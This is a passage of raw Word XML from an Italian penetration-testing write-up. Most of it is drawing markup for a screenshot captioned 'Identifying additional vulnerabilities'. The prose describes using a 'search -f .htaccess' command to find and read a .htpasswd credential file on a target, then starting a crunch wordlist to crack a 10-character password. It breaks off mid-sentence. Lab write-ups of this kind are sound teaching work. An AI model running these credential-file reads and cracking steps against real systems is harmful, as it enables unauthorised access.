                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="35FD2937" w14:textId="77777777" w:rsidR="00250578" w:rsidRDefault="00250578" w:rsidP="002505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63852" id="_x0000_s1043" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:251.2pt;width:311.1pt;height:11.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BcUwIAAJ4EAAAOAAAAZHJzL2Uyb0RvYy54bWysVEtv2zAMvg/YfxB0X21nSR9BnCJrkWFA&#10;0QZoh54ZWYoNyJJGKbG7Xz9Kdpqu22nYRSZFio+PH7247lvNDhJ9Y03Ji7OcM2mErRqzK/n3p/Wn&#10;S858AFOBtkaW/EV6fr38+GHRubmc2NrqSiKjIMbPO1fyOgQ3zzIvatmCP7NOGjIqiy0EUnGXVQgd&#10;RW91Nsnz86yzWDm0QnpPt7eDkS9TfKWkCA9KeRmYLjnVFtKJ6dzGM1suYL5DcHUjxjLgH6pooTGU&#10;9DXULQRge2z+CNU2Aq23KpwJ22ZWqUbI1AN1U+TvunmswcnUC4Hj3StM/v+FFfeHR7dBgqFzfu5J&#10;jF30Ctv4pfpYn8B6eQVL9oEJuvx8NSvyyTlngmzFdHJ5MYtoZqfXDn34Km3LolBypGEkjOBw58Pg&#10;enSJyYxdN1qngWjDupJPZtOcZiaAeKE0BBJbV5Xcmx1noHdEOBEwhfRWN1V8HgN53G1vNLIDxKHn&#10;X/J1mjNV9ptbzH0Lvh78kmlsQJsYRib6jKWe0IlS6Lc9a6iU4iI+iVdbW71skKEdKOadWDeU4A58&#10;2AASp6gT2pPwQIfSltqzo8RZbfHn3+6jP42arJx1xFFq/cceUHKmvxkiwVUxnUZSJ2U6u5iQgm8t&#10;27cWs29vLCFS0EY6kcToH/RRVGjbZ1qnVcxKJjCCcg8gj8pNGHaHFlLI1Sq5EZEdhDvz6EQMHqGL&#10;0D71z4BunH0g1tzbI59h/o4Cg+9AgtU+WNUkfpxwJV5FhZYgMWxc2Lhlb/XkdfqtLH8BAAD//wMA&#10;UEsDBBQABgAIAAAAIQAagdtw3gAAAAgBAAAPAAAAZHJzL2Rvd25yZXYueG1sTI/BbsIwEETvlfoP&#10;1lbqrTgYiiCNg6pKlXqgUgt8gImXJCJeR/EC4e+7PbXH2VnNvCnWY+jUBYfURrIwnWSgkKroW6ot&#10;7HfvT0tQiR1510VCCzdMsC7v7wqX+3ilb7xsuVYSQil3FhrmPtc6VQ0GlyaxRxLvGIfgWORQaz+4&#10;q4SHTpssW+jgWpKGxvX41mB12p6DhbCpVgN/1LP912x527Q71sfwae3jw/j6Aopx5L9n+MUXdCiF&#10;6RDP5JPqLMgQtvCcmTkosRfGGFAHuZj5CnRZ6P8Dyh8AAAD//wMAUEsBAi0AFAAGAAgAAAAhALaD&#10;OJL+AAAA4QEAABMAAAAAAAAAAAAAAAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYA&#10;CAAAACEAOP0h/9YAAACUAQAACwAAAAAAAAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYA&#10;CAAAACEAwKNAXFMCAACeBAAADgAAAAAAAAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAU&#10;AAYACAAAACEAGoHbcN4AAAAIAQAADwAAAAAAAAAAAAAAAACtBAAAZHJzL2Rvd25yZXYueG1sUEsF&#10;BgAAAAAEAAQA8wAAALgFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="35FD2937" w14:textId="77777777" w:rsidR="00250578" w:rsidRDefault="00250578" w:rsidP="00250578">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>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11D55C9B" wp14:editId="013432D9">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>23884</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2886767</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2483892" cy="115731"/>
                <wp:effectExtent l="0" t="0" r="12065" b="17780"/>
                <wp:wrapNone/>
                <wp:docPr id="359868206" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="2483892" cy="115731"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="369AA6CB" w14:textId="77777777" w:rsidR="00250578" w:rsidRDefault="00250578" w:rsidP="002505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55C9B" id="_x0000_s1044" style="position:absolute;left:0;text-align:left;margin-left:1.9pt;margin-top:227.3pt;width:195.6pt;height:9.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sKwUwIAAJ4EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X22n6ZoGcYqsRYYB&#10;RRugHXpWZCk2IIsapcTufv0o2Wm6bqdhF5kUKX48Pnpx3beGHRT6BmzJi7OcM2UlVI3dlfz70/rT&#10;jDMfhK2EAatK/qI8v15+/LDo3FxNoAZTKWQUxPp550peh+DmWeZlrVrhz8ApS0YN2IpAKu6yCkVH&#10;0VuTTfL8c9YBVg5BKu/p9nYw8mWKr7WS4UFrrwIzJafaQjoxndt4ZsuFmO9QuLqRYxniH6poRWMp&#10;6WuoWxEE22PzR6i2kQgedDiT0GagdSNV6oG6KfJ33TzWwqnUC4Hj3StM/v+FlfeHR7dBgqFzfu5J&#10;jF30Gtv4pfpYn8B6eQVL9YFJupxMZ+ezqwlnkmxFcXF5XkQ0s9Nrhz58VdCyKJQcaRgJI3G482Fw&#10;PbrEZBbWjTFpIMayjjJcTHOamRTEC21EILF1Vcm93XEmzI4IJwOmkB5MU8XnMZDH3fbGIDuIOPT8&#10;S75Oc6bKfnOLuW+Frwe/ZBobMDaGUYk+Y6kndKIU+m3PGiqlmMUn8WoL1csGGcJAMe/kuqEEd8KH&#10;jUDiFHVCexIe6NAGqD0YJc5qwJ9/u4/+NGqyctYRR6n1H3uBijPzzRIJrorpNJI6KdOLywkp+Nay&#10;fWux+/YGCJGCNtLJJEb/YI6iRmifaZ1WMSuZhJWUewB5VG7CsDu0kFKtVsmNiOxEuLOPTsbgEboI&#10;7VP/LNCNsw/Emns48lnM31Fg8B1IsNoH0E3ixwlX4lVUaAkSw8aFjVv2Vk9ep9/K8hcAAAD//wMA&#10;UEsDBBQABgAIAAAAIQB012zJ3wAAAAkBAAAPAAAAZHJzL2Rvd25yZXYueG1sTI9BT8JAEIXvJv6H&#10;zZh4k60UsNRuiTEx8QCJAj9g6Q5tY3e26Q5Q/r3jCY9v3uS97xWr0XfqjENsAxl4niSgkKrgWqoN&#10;7HcfTxmoyJac7QKhgStGWJX3d4XNXbjQN563XCsJoZhbAw1zn2sdqwa9jZPQI4l3DIO3LHKotRvs&#10;RcJ9p6dJstDetiQNje3xvcHqZ3vyBvy6Wg78Waf7rzS7rtsd66PfGPP4ML69gmIc+fYMf/iCDqUw&#10;HcKJXFSdgVTA2cBsPluAEj9dzmXbQS4v0wx0Wej/C8pfAAAA//8DAFBLAQItABQABgAIAAAAIQC2&#10;gziS/gAAAOEBAAATAAAAAAAAAAAAAAAAAAAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAi0AFAAG&#10;AAgAAAAhADj9If/WAAAAlAEAAAsAAAAAAAAAAAAAAAAALwEAAF9yZWxzLy5yZWxzUEsBAi0AFAAG&#10;AAgAAAAhAKAGwrBTAgAAngQAAA4AAAAAAAAAAAAAAAAALgIAAGRycy9lMm9Eb2MueG1sUEsBAi0A&#10;FAAGAAgAAAAhAHTXbMnfAAAACQEAAA8AAAAAAAAAAAAAAAAArQQAAGRycy9kb3ducmV2LnhtbFBL&#10;BQYAAAAABAAEAPMAAAC5BQAAAAA=&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="369AA6CB" w14:textId="77777777" w:rsidR="00250578" w:rsidRDefault="00250578" w:rsidP="00250578">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="002A18BB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251692032" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5ADA3D1D" wp14:editId="7ED25FA4">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>3067334</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1917777</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="573206" cy="122830"/>
                <wp:effectExtent l="0" t="0" r="17780" b="10795"/>
                <wp:wrapNone/>
                <wp:docPr id="1165579900" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="573206" cy="122830"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="630775BC" w14:textId="77777777" w:rsidR="002A18BB" w:rsidRDefault="002A18BB" w:rsidP="002A18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A3D1D" id="_x0000_s1045" style="position:absolute;left:0;text-align:left;margin-left:241.5pt;margin-top:151pt;width:45.15pt;height:9.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P7UwIAAJ0EAAAOAAAAZHJzL2Uyb0RvYy54bWysVEtv2zAMvg/YfxB0X+y4SR9BnSJrkGFA&#10;0RZoh54VWYoNyKJGKbGzXz9KTpq222nYRSZFio+PH31907eG7RT6BmzJx6OcM2UlVI3dlPzH8+rL&#10;JWc+CFsJA1aVfK88v5l//nTduZkqoAZTKWQUxPpZ50peh+BmWeZlrVrhR+CUJaMGbEUgFTdZhaKj&#10;6K3Jijw/zzrAyiFI5T3dLgcjn6f4WisZHrT2KjBTcqotpBPTuY5nNr8Wsw0KVzfyUIb4hypa0VhK&#10;+hpqKYJgW2z+CNU2EsGDDiMJbQZaN1KlHqibcf6hm6daOJV6IXC8e4XJ/7+w8n735B6RYOicn3kS&#10;Yxe9xjZ+qT7WJ7D2r2CpPjBJl9OLsyI/50ySaVwUl2cJzOz02KEP3xS0LAolR5pFgkjs7nyghOR6&#10;dIm5LKwaY9I8jGVdyYvpJKeRSUG00EYEEltXldzbDWfCbIhvMmAK6cE0VXweA3ncrG8Nsp2IM8+/&#10;5qtjZe/cYu6l8PXgl0yRDVSVsTGMSuw5lHoCJ0qhX/esoVLGV/FJvFpDtX9EhjAwzDu5aijBnfDh&#10;USBRijqhNQkPdGgD1B4cJM5qwF9/u4/+NGmyctYRRan1n1uBijPz3RIHrsaTSeR0UibTi4IUfGtZ&#10;v7XYbXsLhMiYFtLJJEb/YI6iRmhfaJsWMSuZhJWUewD5oNyGYXVoH6VaLJIb8diJcGefnIzBI3QR&#10;2uf+RaA7zD4Qae7hSGcx+0CBwXcgwWIbQDeJHydcaSxRoR1IAzrsa1yyt3ryOv1V5r8BAAD//wMA&#10;UEsDBBQABgAIAAAAIQDg17to4AAAAAsBAAAPAAAAZHJzL2Rvd25yZXYueG1sTI/NTsMwEITvSLyD&#10;tUjcqNOYn5DGqRASEocilbYP4MZuEjVeR/a2Td+e5QS33Z3R7DfVcvKDOLuY+oAa5rMMhMMm2B5b&#10;Dbvtx0MBIpFBa4aATsPVJVjWtzeVKW244Lc7b6gVHIKpNBo6orGUMjWd8ybNwuiQtUOI3hCvsZU2&#10;mguH+0HmWfYsvemRP3RmdO+da46bk9fgV81rpM9W7daquK76LcmD/9L6/m56W4AgN9GfGX7xGR1q&#10;ZtqHE9okBg2PheIupEFlOQ/seHpRCsSeL/lcgawr+b9D/QMAAP//AwBQSwECLQAUAAYACAAAACEA&#10;toM4kv4AAADhAQAAEwAAAAAAAAAAAAAAAAAAAAAAW0NvbnRlbnRfVHlwZXNdLnhtbFBLAQItABQA&#10;BgAIAAAAIQA4/SH/1gAAAJQBAAALAAAAAAAAAAAAAAAAAC8BAABfcmVscy8ucmVsc1BLAQItABQA&#10;BgAIAAAAIQCVsAP7UwIAAJ0EAAAOAAAAAAAAAAAAAAAAAC4CAABkcnMvZTJvRG9jLnhtbFBLAQIt&#10;ABQABgAIAAAAIQDg17to4AAAAAsBAAAPAAAAAAAAAAAAAAAAAK0EAABkcnMvZG93bnJldi54bWxQ&#10;SwUGAAAAAAQABADzAAAAugUAAAAA&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="630775BC" w14:textId="77777777" w:rsidR="002A18BB" w:rsidRDefault="002A18BB" w:rsidP="002A18BB">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="002A18BB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251689984" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="434C1BF6" wp14:editId="7306B2D4">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>3053222</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>825661</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="539087" cy="143301"/>
                <wp:effectExtent l="0" t="0" r="13970" b="28575"/>
                <wp:wrapNone/>
                <wp:docPr id="108907997" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="539087" cy="143301"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="240E6138" w14:textId="77777777" w:rsidR="002A18BB" w:rsidRDefault="002A18BB" w:rsidP="002A18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C1BF6" id="_x0000_s1046" style="position:absolute;left:0;text-align:left;margin-left:240.4pt;margin-top:65pt;width:42.45pt;height:11.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tDJUQIAAJ0EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X+x8rW0Qp8gaZBhQ&#10;tAXaoWdFlmIDsqhRSuzs14+S3abrdhp2USiRfiQfH7O87hrDjgp9Dbbg41HOmbISytruC/79afvp&#10;kjMfhC2FAasKflKeX68+fli2bqEmUIEpFTICsX7RuoJXIbhFlnlZqUb4EThlyakBGxHoivusRNES&#10;emOySZ5/zlrA0iFI5T29bnonXyV8rZUM91p7FZgpONUW0onp3MUzWy3FYo/CVbUcyhD/UEUjaktJ&#10;X6E2Igh2wPoPqKaWCB50GEloMtC6lir1QN2M83fdPFbCqdQLkePdK03+/8HKu+Oje0CioXV+4cmM&#10;XXQam/hL9bEukXV6JUt1gUl6nE+v8ssLziS5xrPpNB9HMrPzxw59+KqgYdEoONIsEkXieOtDH/oS&#10;EnNZ2NbGpHkYy9qCT+aznEYmBclCGxHIbFxZcG/3nAmzJ73JgAnSg6nL+HkE8rjf3RhkRxFnnn/J&#10;t2nMVNlvYTH3Rviqj0uuoQFjI4xK6hlKPZMTrdDtOlZTKZOEHJ92UJ4ekCH0CvNObmtKcCt8eBBI&#10;kqJOaE3CPR3aALUHg8VZBfjzb+8xniZNXs5akii1/uMgUHFmvlnSwNV4NouaTpfZ/IKqYfjWs3vr&#10;sYfmBoiRMS2kk8mM8cG8mBqheaZtWses5BJWUu6e5OFyE/rVoX2Uar1OYaRjJ8KtfXQygkfqIrVP&#10;3bNAN8w+kGju4EXOYvFOAn1sL4L1IYCukz7OvJKu4oV2ICls2Ne4ZG/vKer8r7L6BQAA//8DAFBL&#10;AwQUAAYACAAAACEAqZHfcN8AAAALAQAADwAAAGRycy9kb3ducmV2LnhtbEyPwU7DMBBE70j8g7VI&#10;3KhNQ0IIcSqEhMShSND2A9x4m0TEdmRv2/TvWU5w3JnR7Jt6NbtRnDCmIXgN9wsFAn0b7OA7Dbvt&#10;210JIpHx1ozBo4YLJlg111e1qWw4+y88bagTXOJTZTT0RFMlZWp7dCYtwoSevUOIzhCfsZM2mjOX&#10;u1EulSqkM4PnD72Z8LXH9ntzdBrcun2K9N5lu8+svKyHLcmD+9D69mZ+eQZBONNfGH7xGR0aZtqH&#10;o7dJjBoeSsXoxEameBQn8iJ/BLFnJV8WIJta/t/Q/AAAAP//AwBQSwECLQAUAAYACAAAACEAtoM4&#10;kv4AAADhAQAAEwAAAAAAAAAAAAAAAAAAAAAAW0NvbnRlbnRfVHlwZXNdLnhtbFBLAQItABQABgAI&#10;AAAAIQA4/SH/1gAAAJQBAAALAAAAAAAAAAAAAAAAAC8BAABfcmVscy8ucmVsc1BLAQItABQABgAI&#10;AAAAIQDwDtDJUQIAAJ0EAAAOAAAAAAAAAAAAAAAAAC4CAABkcnMvZTJvRG9jLnhtbFBLAQItABQA&#10;BgAIAAAAIQCpkd9w3wAAAAsBAAAPAAAAAAAAAAAAAAAAAKsEAABkcnMvZG93bnJldi54bWxQSwUG&#10;AAAAAAQABADzAAAAtwUAAAAA&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="240E6138" w14:textId="77777777" w:rsidR="002A18BB" w:rsidRDefault="002A18BB" w:rsidP="002A18BB">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="002A18BB" w:rsidRPr="002A18BB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7321EE07" wp14:editId="65664AD3">
            <wp:extent cx="5274310" cy="3545205"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="19606546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54615" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId50"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="3545205"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="009530C8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura 20: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009530C8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Identifying</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009530C8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009530C8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>additional</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009530C8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009530C8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>vulnerabilities</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="06441589" w14:textId="77777777" w:rsidR="00250578" w:rsidRDefault="00250578" w:rsidP="00033D6F"/>
    <w:p w14:paraId="2A6D795D" w14:textId="12E15E5B" w:rsidR="009530C8" w:rsidRDefault="002A18BB" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Si poteva anche effettuare una ricerca specifica sul file tramite: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00703494" w:rsidRPr="002A18BB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>search</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00703494" w:rsidRPr="002A18BB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -f .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00703494" w:rsidRPr="002A18BB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>htaccess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e poi inoltrarsi nelle directory e scoprire subito il contenuto del </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>file.</w:t>
      </w:r>
      <w:r w:rsidRPr="002A18BB">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>htpasswd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356D52D2" w14:textId="601C3038" w:rsidR="009530C8" w:rsidRDefault="009530C8" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Quindi, abbiamo scoperto che la </w:t>
      </w:r>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>password è una stringa del tipo “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>eafhrt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">” di </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> caratteri. Tramite </w:t>
      </w:r>
      <w:r w:rsidR="00C22492" w:rsidRPr="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>crunch</w:t>
      </w:r>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> andremo a</w:t>
      </w:r>
      <w:r w:rsidR="00B41D73">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> creare</w:t>
      </w:r>
      <w:r w:rsidR="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> una </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C22492" w:rsidRPr="00C22492">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wordlist</w:t>
      </w:r>
